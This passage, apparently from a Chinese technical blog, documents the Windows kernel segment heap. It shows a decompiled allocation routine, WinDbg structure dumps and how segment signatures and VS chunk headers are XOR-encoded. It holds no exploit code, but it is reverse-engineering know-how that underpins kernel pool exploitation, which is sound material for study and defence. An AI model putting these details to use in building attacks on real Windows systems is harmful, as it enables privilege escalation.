可变量大小后端(VS)  &lt;= 0x20000
分段分配(SEG)  &lt;= 0x7f0000
Large</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">RtlpHpAllocateHeapInternal</span>(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2, <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> a3, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> a4, <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>a5)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v6; <span style="color:#6272a4">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v7; <span style="color:#6272a4">// rsi
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v9; <span style="color:#6272a4">// ebp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v10; <span style="color:#6272a4">// rcx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v11; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#ff79c6">=</span> a3;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> a2;
</span></span><span style="display:flex;"><span>  v9 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( a3 <span style="color:#ff79c6">&gt;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">892</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">16</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">||</span> (v10 <span style="color:#ff79c6">=</span> RtlpHpLfhContextAllocate(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">832</span>, a2, a3, a4), a3 <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)v6, a2 <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)v7, v10 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v6 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x20000</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( v6 <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">464</span>) )
</span></span><span style="display:flex;"><span>        v11 <span style="color:#ff79c6">=</span> RtlpHpLargeAlloc(a1, v7, v6, a4);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        v11 <span style="color:#ff79c6">=</span> RtlpHpSegAlloc((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)a1 <span style="color:#ff79c6">+</span> (<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">272</span>) <span style="color:#ff79c6">&lt;</span> v6 <span style="color:#ff79c6">?</span> <span style="color:#bd93f9">448</span> <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">256</span>), v7, v6, v6, a4);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v11 <span style="color:#ff79c6">=</span> RtlpHpVsContextAllocate(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">640</span>, a2, a3, a4);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v10 <span style="color:#ff79c6">=</span> v11;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v9 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>a5 <span style="color:#ff79c6">=</span> v9;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v10;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>LFH,VS,SEG分别关联了对应的上下文(CONTEXT)，这些后端的上下文存储在<code>_SEGMENT_HEAP</code>结构中偏移0x100,0x280,0x340的位置</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span>_SEGMENT_HEAP
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">EnvHandle</span>        : RTL_HP_ENV_HANDLE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x010</span> <span style="color:#8be9fd;font-style:italic">Signature</span>        : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x014</span> <span style="color:#8be9fd;font-style:italic">GlobalFlags</span>      : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x018</span> <span style="color:#8be9fd;font-style:italic">Interceptor</span>      : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x01c</span> <span style="color:#8be9fd;font-style:italic">ProcessHeapListIndex</span> : Uint2B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x01e</span> <span style="color:#8be9fd;font-style:italic">AllocatedFromMetadata</span> : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x020</span> <span style="color:#8be9fd;font-style:italic">CommitLimitData</span>  : _RTL_HEAP_MEMORY_LIMIT_DATA
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x020</span> <span style="color:#8be9fd;font-style:italic">ReservedMustBeZero1</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x028</span> <span style="color:#8be9fd;font-style:italic">UserContext</span>      : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x030</span> <span style="color:#8be9fd;font-style:italic">ReservedMustBeZero2</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x038</span> <span style="color:#8be9fd;font-style:italic">Spare</span>            : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x040</span> <span style="color:#8be9fd;font-style:italic">LargeMetadataLock</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x048</span> <span style="color:#8be9fd;font-style:italic">LargeAllocMetadata</span> : _RTL_RB_TREE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x058</span> <span style="color:#8be9fd;font-style:italic">LargeReservedPages</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x060</span> <span style="color:#8be9fd;font-style:italic">LargeCommittedPages</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x068</span> <span style="color:#8be9fd;font-style:italic">StackTraceInitVar</span> : _RTL_RUN_ONCE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x080</span> <span style="color:#8be9fd;font-style:italic">MemStats</span>         : _HEAP_RUNTIME_MEMORY_STATS
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0d8</span> <span style="color:#8be9fd;font-style:italic">GlobalLockCount</span>  : Uint2B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0dc</span> <span style="color:#8be9fd;font-style:italic">GlobalLockOwner</span>  : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0e0</span> <span style="color:#8be9fd;font-style:italic">ContextExtendLock</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0e8</span> <span style="color:#8be9fd;font-style:italic">AllocatedBase</span>    : Ptr64 UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0f0</span> <span style="color:#8be9fd;font-style:italic">UncommittedBase</span>  : Ptr64 UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0f8</span> <span style="color:#8be9fd;font-style:italic">ReservedLimit</span>    : Ptr64 UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x100</span> <span style="color:#8be9fd;font-style:italic">SegContexts</span>      : [<span style="color:#bd93f9">2</span>] _HEAP_SEG_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x280</span> <span style="color:#8be9fd;font-style:italic">VsContext</span>        : _HEAP_VS_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x340</span> <span style="color:#8be9fd;font-style:italic">LfhContext</span>       : _HEAP_LFH_CONTEXT
</span></span></code></pre></div><p>不同的<code>POOL_TYPE</code>,都有1个<code>_SEGMENT_HEAP</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt _POOL_TYPE
</span></span><span style="display:flex;"><span>ntdll<span style="color:#ff79c6">!</span>_POOL_TYPE
</span></span><span style="display:flex;"><span>   NonPagedPool <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n0
</span></span><span style="display:flex;"><span>   NonPagedPoolExecute <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n0
</span></span><span style="display:flex;"><span>   PagedPool <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n1
</span></span><span style="display:flex;"><span>   NonPagedPoolMustSucceed <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n2
</span></span><span style="display:flex;"><span>   DontUseThisType <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n3
</span></span><span style="display:flex;"><span>   NonPagedPoolCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n4
</span></span><span style="display:flex;"><span>   PagedPoolCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n5
</span></span><span style="display:flex;"><span>   NonPagedPoolCacheAlignedMustS <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n6
</span></span><span style="display:flex;"><span>   MaxPoolType <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n7
</span></span><span style="display:flex;"><span>   NonPagedPoolBase <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n0
</span></span><span style="display:flex;"><span>   NonPagedPoolBaseMustSucceed <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n2
</span></span><span style="display:flex;"><span>   NonPagedPoolBaseCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n4
</span></span><span style="display:flex;"><span>   NonPagedPoolBaseCacheAlignedMustS <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n6
</span></span><span style="display:flex;"><span>   NonPagedPoolSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n32
</span></span><span style="display:flex;"><span>   PagedPoolSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n33
</span></span><span style="display:flex;"><span>   NonPagedPoolMustSucceedSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n34
</span></span><span style="display:flex;"><span>   DontUseThisTypeSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n35
</span></span><span style="display:flex;"><span>   NonPagedPoolCacheAlignedSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n36
</span></span><span style="display:flex;"><span>   PagedPoolCacheAlignedSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n37
</span></span><span style="display:flex;"><span>   NonPagedPoolCacheAlignedMustSSession <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n38
</span></span><span style="display:flex;"><span>   NonPagedPoolNx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n512
</span></span><span style="display:flex;"><span>   NonPagedPoolNxCacheAligned <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n516
</span></span><span style="display:flex;"><span>   NonPagedPoolSessionNx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>n544
</span></span></code></pre></div><h5 id="segment-backend">Segment Backend</h5>
<p>SegAlloc后端是用于分配大小在128 KB和7 GB之间的内存块。它也用于后台，为VS和LFH后端分配内存。</p>
<p>段后端上下文存储在一个名为<code>_HEAP_SEG_CONTEXT</code>的结构中。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span>_HEAP_SEG_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">SegmentMask</span>      : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">UnitShift</span>        : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x009</span> <span style="color:#8be9fd;font-style:italic">PagesPerUnitShift</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x00a</span> <span style="color:#8be9fd;font-style:italic">FirstDescriptorIndex</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x00b</span> <span style="color:#8be9fd;font-style:italic">CachedCommitSoftShift</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x00c</span> <span style="color:#8be9fd;font-style:italic">CachedCommitHighShift</span> : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x00d</span> <span style="color:#8be9fd;font-style:italic">Flags</span>            : <span style="color:#ff79c6">&lt;</span>anonymous<span style="color:#ff79c6">-</span>tag<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x010</span> <span style="color:#8be9fd;font-style:italic">MaxAllocationSize</span> : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x014</span> <span style="color:#8be9fd;font-style:italic">OlpStatsOffset</span>   : Int2B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x016</span> <span style="color:#8be9fd;font-style:italic">MemStatsOffset</span>   : Int2B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x018</span> <span style="color:#8be9fd;font-style:italic">LfhContext</span>       : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x020</span> <span style="color:#8be9fd;font-style:italic">VsContext</span>        : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x028</span> <span style="color:#8be9fd;font-style:italic">EnvHandle</span>        : RTL_HP_ENV_HANDLE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x038</span> <span style="color:#8be9fd;font-style:italic">Heap</span>             : Ptr64 Void
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x040</span> <span style="color:#8be9fd;font-style:italic">SegmentLock</span>      : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x048</span> <span style="color:#8be9fd;font-style:italic">SegmentListHead</span>  : _LIST_ENTRY
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x058</span> <span style="color:#8be9fd;font-style:italic">SegmentCount</span>     : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x060</span> <span style="color:#8be9fd;font-style:italic">FreePageRanges</span>   : _RTL_RB_TREE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x070</span> <span style="color:#8be9fd;font-style:italic">FreeSegmentListLock</span> : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x078</span> <span style="color:#8be9fd;font-style:italic">FreeSegmentList</span>  : [<span style="color:#bd93f9">2</span>] _SINGLE_LIST_ENTRY
</span></span></code></pre></div><p>段存储在存储在SegmentListHead中的链表中。段头为<code>_HEAP_PAGE_SEGMENT</code>，后面是256个<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>结构。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span>_HEAP_PAGE_SEGMENT
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">ListEntry</span>        : _LIST_ENTRY
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x010</span> <span style="color:#8be9fd;font-style:italic">Signature</span>        : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x018</span> <span style="color:#8be9fd;font-style:italic">SegmentCommitState</span> : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x020</span> <span style="color:#8be9fd;font-style:italic">UnusedWatermark</span>  : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">DescArray</span>        : [<span style="color:#bd93f9">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR
</span></span></code></pre></div><p><code>_HEAP_SEG_CONTEXT</code>中还维护了一个红黑树，而<code>_HEAP_PAGE_SEGMENT</code>中的Signature是每个<code>_HEAP_PAGE_SEGMEN</code>T都有的一个签名计算</p>
<p>计算方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Signature <span style="color:#ff79c6">=</span> Segment <span style="color:#ff79c6">^</span> SegContext <span style="color:#ff79c6">^</span> RtlpHpHeapGlobals <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0xA2E64EADA2E64EAD</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// SegContext: 所属的_HEAP_SEG_CONTEXT
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Segment <span style="color:#ff79c6">=</span> Addr <span style="color:#ff79c6">&amp;</span> SegContext<span style="color:#ff79c6">-&gt;</span>SegmentMask;
</span></span></code></pre></div><h5 id="variable-size-backend">Variable Size Backend</h5>
<p>可变大小后端分配512B到128KB大小的块。它的目的是在提供对空闲块的重用。它存储在<code>_HEAP_VS_CONTEXT</code>结构体中。</p>
<ul>
<li>空闲块以<code>_HEAP_VS_CHUNK_FREE_HEADER</code>的专用结构体为头部。</li>
<li>而已经被分配的块都会以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd <span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span> _HEAP_VS_CONTEXT
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">Lock</span> : Uint8B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">LockType</span> : _RTLP_HP_LOCK_TYPE
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x010 <span style="color:#8be9fd;font-style:italic">FreeChunkTree</span> : _RTL_RB_TREE
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x020 <span style="color:#8be9fd;font-style:italic">SubsegmentList</span> : _LIST_ENTRY
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x030 <span style="color:#8be9fd;font-style:italic">TotalCommittedUnits</span> : Uint8B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x038 <span style="color:#8be9fd;font-style:italic">FreeCommittedUnits</span> : Uint8B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x040 <span style="color:#8be9fd;font-style:italic">DelayFreeContext</span> : _HEAP_VS_DELAY_FREE_CONTEXT
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x080 <span style="color:#8be9fd;font-style:italic">BackendCtx</span> : Ptr64 Void
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x088 <span style="color:#8be9fd;font-style:italic">Callbacks</span> : _HEAP_SUBALLOCATOR_CALLBACKS
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x0b0 <span style="color:#8be9fd;font-style:italic">Config</span> : _RTL_HP_VS_CONFIG
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x0b4 <span style="color:#8be9fd;font-style:italic">Flags</span> : Uint4B
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd <span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span> _HEAP_VS_CHUNK_HEADER
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">Sizes</span> : _HEAP_VS_CHUNK_HEADER_SIZE
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">EncodedSegmentPageOffset</span> : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">UnusedBytes</span> : Pos <span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">1</span> Bit
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">SkipDuringWalk</span> : Pos <span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">1</span> Bit
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">Spare</span> : Pos <span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">22</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">AllocatedChunkBits</span> : Uint4B
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd <span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span> _HEAP_VS_CHUNK_HEADER_SIZE
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">MemoryCost</span> : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">16</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">UnsafeSize</span> : Pos <span style="color:#bd93f9">16</span>, <span style="color:#bd93f9">16</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x004 <span style="color:#8be9fd;font-style:italic">UnsafePrevSize</span> : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">16</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x004 <span style="color:#8be9fd;font-style:italic">Allocated</span> : Pos <span style="color:#bd93f9">16</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">KeyUShort</span> : Uint2B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">KeyULong</span> : Uint4B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">HeaderBits</span> : Uint8B
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd <span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span> _HEAP_VS_CHUNK_FREE_HEADER
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">Header</span> : _HEAP_VS_CHUNK_HEADER
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x000 <span style="color:#8be9fd;font-style:italic">OverlapsHeader</span> : Uint8B
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span> x008 <span style="color:#8be9fd;font-style:italic">Node</span> : _RTL_BALANCED_NODE
</span></span></code></pre></div><p>已被分配的块都以<code>_HEAP_VS_CHUNK_HEADER</code>的结构体开头。而header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Chunk<span style="color:#ff79c6">-&gt;</span>Sizes <span style="color:#ff79c6">=</span> Chunk<span style="color:#ff79c6">-&gt;</span>Sizes <span style="color:#ff79c6">^</span> Chunk <span style="color:#ff79c6">^</span> RtlpHpHeapGlobals ;
</span></span><span style="display:flex;"><span>
